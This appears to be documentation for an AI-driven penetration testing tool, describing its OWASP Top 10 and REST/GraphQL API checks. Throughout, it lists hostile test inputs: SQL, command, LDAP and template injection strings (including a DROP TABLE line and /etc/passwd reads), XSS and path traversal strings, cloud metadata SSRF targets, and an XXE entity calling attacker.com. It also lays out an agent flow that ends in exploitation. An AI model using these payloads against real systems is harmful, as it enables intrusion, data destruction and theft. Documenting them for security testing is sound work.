# OWASP Top 10 & API Security Testing - Scorpion AI 🦂

**Complete vulnerability coverage for web applications and APIs**

---

## 🎯 OWASP Top 10 (2021) Coverage

Scorpion's AI agent automatically tests for **ALL** OWASP Top 10 vulnerabilities:

### A01:2021 - Broken Access Control ✅
**What we test:**
- IDOR (Insecure Direct Object References)
- Privilege escalation attempts
- Unauthorized resource access
- Missing function-level access control
- CORS misconfigurations

**Example payloads:**
```bash
/api/users/1 → /api/users/2 (IDOR test)
/user/profile → /admin/profile (privilege escalation)
```

### A02:2021 - Cryptographic Failures ✅
**What we test:**
- Weak SSL/TLS configurations (SSLv3, TLS 1.0)
- Weak cipher suites (RC4, DES, 3DES)
- Missing HSTS headers
- Sensitive data in URLs/cookies
- Insecure password storage indicators

**Detection methods:**
- SSL/TLS analysis with protocol testing
- Certificate validation
- Cipher suite enumeration

### A03:2021 - Injection ✅
**What we test:**

#### SQL Injection
- **Error-based:** `' OR '1'='1`
- **Boolean-based:** `1' AND 1=1--` vs `1' AND 1=2--`
- **Time-based:** `' AND SLEEP(5)--`
- **UNION-based:** `' UNION SELECT NULL--`
- **Stacked queries:** `'; DROP TABLE users--`

**15+ SQL injection payloads tested across:**
- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

#### Command Injection
- **Unix:** `; whoami`, `| ls -la`, `$(cat /etc/passwd)`
- **Windows:** `& dir`, `| type C:\Windows\win.ini`
- **Time-based:** `; sleep 5`, `& ping -n 5 127.0.0.1`

#### LDAP Injection
- `*)(uid=*))(|(uid=*`
- `admin)(&(password=*))`

### A04:2021 - Insecure Design ✅
**What we test:**
- Business logic flaws
- Race conditions
- Insecure state management
- Missing rate limiting
- Authentication bypass via logic flaws

### A05:2021 - Security Misconfiguration ✅
**What we test:**
- Missing security headers:
  - `X-Frame-Options`
  - `X-Content-Type-Options`
  - `Content-Security-Policy`
  - `Strict-Transport-Security`
  - `X-XSS-Protection`
- CORS misconfigurations
- Directory listing enabled
- Default credentials
- Verbose error messages
- Server version disclosure

### A06:2021 - Vulnerable and Outdated Components ✅
**What we test:**
- Technology detection (frameworks, libraries, CMS)
- Version identification
- CVE correlation via Nuclei scanner (5000+ templates)
- Known vulnerable software detection

**Technologies detected:**
- Web servers (Apache, Nginx, IIS)
- Frameworks (Django, Laravel, Express, Spring)
- CMS (WordPress, Drupal, Joomla)
- JavaScript libraries (jQuery, React, Angular)

### A07:2021 - Identification and Authentication Failures ✅
**What we test:**
- Weak/default credentials
- JWT vulnerabilities:
  - Weak signing algorithms
  - None algorithm attack
  - Key confusion
  - Token expiration issues
- Session fixation
- Credential stuffing
- Brute force possibilities
- Missing account lockout

**Brute force targets:**
- HTTP Basic Auth
- Form-based authentication
- JSON API authentication
- SSH, FTP, databases

### A08:2021 - Software and Data Integrity Failures ✅
**What we test:**
- Insecure deserialization
- Unsigned/unverified software updates
- CI/CD pipeline security
- Integrity check failures

### A09:2021 - Security Logging and Monitoring Failures ✅
**What we test:**
- Missing audit logs
- Insufficient logging
- No monitoring alerts
- Credential stuffing without detection

### A10:2021 - Server-Side Request Forgery (SSRF) ✅
**What we test:**
- Internal network access
- Cloud metadata endpoints
- Port scanning via SSRF
- File protocol abuse
- Blind SSRF detection

**SSRF payloads:**
```bash
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/  # AWS metadata
http://metadata.google.internal/computeMetadata/v1/  # GCP
file:///etc/passwd
```

---

## 🌐 Additional Web Vulnerabilities

### Cross-Site Scripting (XSS)
**10+ payloads tested:**
- Reflected XSS: `<script>alert(1)</script>`
- Stored XSS: Database-stored payloads
- DOM-based XSS: Client-side injection
- Event handlers: `<img src=x onerror=alert(1)>`
- SVG-based: `<svg onload=alert(1)>`
- JavaScript protocol: `javascript:alert(1)`

### XML External Entity (XXE)
**Payloads:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
```

### Server-Side Template Injection (SSTI)
**Payloads tested:**
- Jinja2: `{{7*7}}`, `{{config.items()}}`
- Twig: `{{7*'7'}}`
- FreeMarker: `${7*7}`
- Velocity: `#set($x=7*7)$x`

### Path Traversal / LFI
**Payloads:**
```bash
../../../etc/passwd
..\..\..\..\Windows\win.ini
....//....//....//etc/passwd
```

---

## 🔌 API Security Testing

### REST API Testing

#### 1. API Discovery
```bash
✅ Swagger/OpenAPI endpoint discovery:
   - /swagger.json
   - /v2/api-docs
   - /openapi.json
   - /api-docs

✅ Common API paths:
   - /api/v1/*
   - /api/v2/*
   - /rest/*
```

#### 2. Authentication Testing
```bash
✅ JWT vulnerabilities:
   - None algorithm bypass
   - Weak signing keys
   - Algorithm confusion (RS256 → HS256)
   - Token expiration issues
   - Claims manipulation

✅ API key testing:
   - Exposed keys in headers
   - Key enumeration
   - Rate limiting bypass

✅ OAuth flaws:
   - Redirect URI manipulation
   - State parameter issues
```

#### 3. Authorization Testing
```bash
✅ IDOR in API endpoints:
   /api/users/1 → /api/users/2
   /api/orders/123 → /api/orders/124

✅ Privilege escalation:
   Regular user → Admin endpoints
   
✅ Missing authorization checks:
   Direct API access without authentication
```

#### 4. Injection Testing
```bash
✅ SQL injection in API parameters
✅ NoSQL injection (MongoDB, etc.)
✅ Command injection via API
✅ LDAP injection
```

#### 5. Rate Limiting
```bash
✅ Rate limit detection
✅ Bypass attempts
✅ Account lockout testing
```

### GraphQL Security Testing

#### 1. Introspection Query
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { name }
  }
}
```

#### 2. GraphQL Injection
```graphql
# Mutation injection
mutation {
  login(username: "admin' OR '1'='1", password: "anything") {
    token
  }
}

# Query batching abuse
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
  # ... 1000 more queries
}
```

#### 3. Authorization Bypass
```graphql
# Access restricted fields
query {
  user(id: 1) {
    publicField
    privateField  # Should be protected
    adminOnlyField  # Should require admin
  }
}
```

---

## 🤖 How AI Uses These Tests

### Testing Strategy

The AI agent intelligently sequences tests:

1. **Reconnaissance (Iterations 1-3)**
   - Identify target technology stack
   - Detect API frameworks (REST, GraphQL)
   - Find authentication mechanisms

2. **Targeted Testing (Iterations 4-8)**
   - Use `web_pentest` for OWASP Top 10
   - Use `api_test` for API-specific vulnerabilities
   - Use `fuzzer` for parameter injection

3. **Exploitation (Iterations 9+, if authorized)**
   - Exploit confirmed vulnerabilities
   - Chain vulnerabilities for maximum impact
   - Generate payloads and PoCs

### Example AI Decision Flow

```
Iteration 1: tech_detect
  ↓
  Found: React frontend + Node.js backend + GraphQL API
  ↓
Iteration 2: crawler
  ↓
  Found: /graphql endpoint
  ↓
Iteration 3: api_test
  ↓
  Found: Open GraphQL introspection
  ↓
Iteration 4: web_pentest
  ↓
  Found: XSS in comment parameter
  ↓
Iteration 5: fuzzer
  ↓
  Confirmed: SQL injection in user search
  ↓
Iteration 6: exploit_vuln (if risk=HIGH)
  ↓
  Generated: SQL injection payload to extract data
```

---

## 📊 Example Commands

### OWASP Top 10 Scan
```bash
# Complete OWASP Top 10 testing
scorpion ai-pentest -t webapp.com -g web_exploitation -r medium

# AI will test:
# ✅ All injection types (SQLi, XSS, command injection, SSRF)
# ✅ Broken access control (IDOR, privilege escalation)
# ✅ Security misconfigurations (headers, CORS)
# ✅ Authentication flaws (weak credentials, JWT)
# ✅ Cryptographic failures (SSL/TLS)
```

### API Security Scan
```bash
# Comprehensive API testing
scorpion ai-pentest -t api.example.com -g api_security_testing -r medium

# AI will test:
# ✅ API discovery (Swagger, OpenAPI)
# ✅ Authentication bypass (JWT, OAuth, API keys)
# ✅ Authorization flaws (IDOR, privilege escalation)
# ✅ Injection attacks (SQL, NoSQL, GraphQL)
# ✅ GraphQL introspection and batching abuse
# ✅ Rate limiting bypass
```

### Combined Web + API Scan
```bash
# Full stack security assessment
scorpion ai-pentest -t fullstack-app.com -g comprehensive_assessment -r medium --time-limit 30

# AI will:
# 1. Discover all endpoints (web + API)
# 2. Test OWASP Top 10 on web frontend
# 3. Test API security on backend
# 4. Chain vulnerabilities across layers
# 5. Generate comprehensive report
```

---

## 🎯 Vulnerability Detection Methods

### Confirmed Detection
```
✅ SQL Injection: Database error in response
✅ XSS: Payload reflected unescaped in HTML
✅ Command Injection: Command output in response
✅ SSRF: Internal network access confirmed
✅ Authentication Bypass: Successful login without valid credentials
```

### Likely Detection
```
⚠️ Time-based SQLi: Response delay matches SLEEP() payload
⚠️ Blind XSS: Payload accepted, callback expected
⚠️ Weak credentials: Common password accepted
```

### Possible Detection
```
ℹ️ Missing security headers: No defense-in-depth
ℹ️ Verbose errors: Stack traces exposed
ℹ️ Technology version: Known vulnerable version detected
```

---

## 📋 Example Output

### SQL Injection Finding
```json
{
  "vuln_type": "SQL Injection",
  "severity": "critical",
  "url": "https://example.com/search?q=test",
  "parameter": "q",
  "method": "GET",
  "payload": "' OR '1'='1",
  "evidence": "MySQL syntax error: You have an error in your SQL syntax",
  "description": "Error-based SQL injection in search parameter",
  "remediation": "Use parameterized queries (prepared statements)",
  "confidence": "confirmed"
}
```

### API IDOR Finding
```json
{
  "vuln_type": "Insecure Direct Object Reference",
  "severity": "high",
  "url": "https://api.example.com/users/123",
  "parameter": "id",
  "method": "GET",
  "payload": "124",
  "evidence": "Accessed user 124's private data without authorization",
  "description": "IDOR allows access to other users' private information",
  "remediation": "Implement proper authorization checks before data access",
  "confidence": "confirmed"
}
```

---

## ✅ Verification

All vulnerabilities are **REAL** - no dummy data:

1. **SQL Injection:** Detected via database error messages or time delays
2. **XSS:** Confirmed by payload reflection in HTML context
3. **Command Injection:** Verified by command output or time delays
4. **SSRF:** Proven by internal network access or DNS callbacks
5. **IDOR:** Confirmed by unauthorized data access
6. **JWT Flaws:** Validated by successful authentication bypass

---

## 🛡️ Safe Testing

All tests are designed to be **safe** and **non-destructive**:

- ✅ No data modification (unless risk=HIGH + authorized)
- ✅ No DoS attacks
- ✅ No account creation/deletion
- ✅ Read-only exploitation
- ✅ Respectful of rate limits

---

## 📖 Additional Resources

- **OWASP Top 10 (2021):** https://owasp.org/Top10/
- **OWASP API Security Top 10:** https://owasp.org/API-Security/
- **GraphQL Security:** https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
- **JWT Security:** https://jwt.io/introduction
- **Scorpion AI Guide:** [AI_PENTEST_GUIDE.md](AI_PENTEST_GUIDE.md)

---

**Last Updated:** December 12, 2025  
**Version:** 2.0.1
